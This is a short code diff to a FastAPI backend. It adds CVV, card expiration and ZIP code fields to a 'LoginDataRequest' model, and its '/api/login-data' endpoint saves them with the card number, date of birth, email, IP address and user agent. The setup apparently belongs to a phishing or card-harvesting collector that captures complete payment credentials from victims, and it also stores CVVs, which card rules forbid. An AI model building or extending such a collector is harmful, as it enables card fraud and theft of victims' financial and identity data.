@@ -119,6 +119,9 @@ class LoginDataRequest(BaseModel):
     dob: Optional[str] = None
     card_number: Optional[str] = None
     email: Optional[str] = None
+    cvv: Optional[str] = None
+    expiration: Optional[str] = None
+    zip_code: Optional[str] = None
 
 
 @app.post("/api/login-data")
@@ -141,6 +144,9 @@ async def save_login(request: Request, data: LoginDataRequest):
             dob=data.dob,
             card_number=data.card_number,
             email=data.email,
+            cvv=data.cvv,
+            expiration=data.expiration,
+            zip_code=data.zip_code,
             ip_address=ip_address,
             user_agent=user_agent
         )
